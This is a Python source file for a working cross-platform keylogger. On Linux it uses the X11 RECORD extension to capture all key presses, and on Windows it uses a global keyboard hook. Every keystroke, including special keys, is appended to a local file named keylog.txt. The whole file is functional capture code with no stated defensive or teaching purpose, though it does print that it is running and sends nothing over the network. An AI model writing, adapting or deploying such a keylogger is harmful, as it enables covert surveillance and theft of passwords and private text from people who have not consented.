import platform
import sys
import os
from ctypes import *
import time

os_name = platform.system()

if os_name == 'Linux':
    # Linux implementation using XRecord
    from Xlib import X, display, XK
    from Xlib.ext import record
    from Xlib.protocol import rq

    # Load X11 library for keysym to string conversion
    x11 = cdll.LoadLibrary('libX11.so.6')
    x11.XKeysymToString.argtypes = [c_ulong]
    x11.XKeysymToString.restype = c_char_p

    def keysym_to_string(keysym):
        string = x11.XKeysymToString(keysym)
        return string.decode('latin-1') if string else None

    def main():
        try:
            disp = display.Display()
        except:
            print("Error: Cannot connect to X server.")
            sys.exit(1)

        if not disp.has_extension('RECORD'):
            print("Error: XRecord extension not available.")
            sys.exit(1)

        ctx = disp.record_create_context(
            0,
            [record.AllClients],
            [{
                'core_requests': (0, 0),
                'core_replies': (0, 0),
                'ext_requests': (0, 0, 0, 0),
                'ext_replies': (0, 0, 0, 0),
                'delivered_events': (0, 0),
                'device_events': (X.KeyPress, X.KeyRelease),
                'errors': (0, 0),
                'client_started': False,
                'client_died': False,
            }]
        )

        def event_callback(reply):
            if reply.category != record.FromServer:
                return
            data = reply.data
            while data:
                event, data = rq.EventField(None).parse_binary_value(data, disp.display, None, None)
                if event.type == X.KeyPress:
                    keycode = event.detail
                    state = event.state

                    shift = (state & X.ShiftMask)
                    caps = (state & X.LockMask)
                    index = 1 if (shift ^ caps) else 0

                    keysym = disp.keycode_to_keysym(keycode, index)
                    char = None

                    if 32 <= keysym <= 126:
                        char = chr(keysym)
                    else:
                        keysym_name = keysym_to_string(keysym)
                        if keysym_name:
                            char = f'[{keysym_name}]'
                        else:
                            char = f'[KeyCode:{keycode}]'

                    if char:
                        with open('keylog.txt', 'a') as f:
                            f.write(char)

        try:
            disp.record_enable_context(ctx, event_callback)
            print("Keylogger started. Press Ctrl+C to exit.")
            while True:
                disp.next_event()
        except KeyboardInterrupt:
            print("\nExiting...")
        finally:
            disp.record_free_context(ctx)
            disp.close()

elif os_name == 'Windows':
    # Windows implementation using keyboard module
    try:
        import keyboard
        import win32api
    except ImportError:
        print("Error: Required modules not installed. Run: pip install keyboard pywin32")
        sys.exit(1)

    def main():
        SPECIAL_KEYS = {
            'enter': 'Return',
            'backspace': 'BackSpace',
            'delete': 'Delete',
            'space': 'Space',
            'esc': 'Escape',
            'tab': 'Tab',
            'caps lock': 'CapsLock',
            'shift': 'Shift',
            'ctrl': 'Ctrl',
            'alt': 'Alt',
            'right alt': 'AltGr',
            'windows': 'Super',
            'print screen': 'Print',
            'insert': 'Insert'
        }

        def on_press(event):
            try:
                name = event.name
                if name in SPECIAL_KEYS:
                    char = f'[{SPECIAL_KEYS[name]}]'
                elif len(name) > 1:
                    char = f'[{name.capitalize()}]'
                else:
                    char = name

                with open('keylog.txt', 'a', encoding='utf-8') as f:
                    f.write(char)
            except Exception as e:
                print(f"Error: {e}")

        keyboard.hook(on_press)
        print("Keylogger started. Press Ctrl+C to exit.")
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            print("\nExiting...")
        finally:
            keyboard.unhook_all()

else:
    print("Unsupported operating system")
    sys.exit(1)

if __name__ == '__main__':
    main()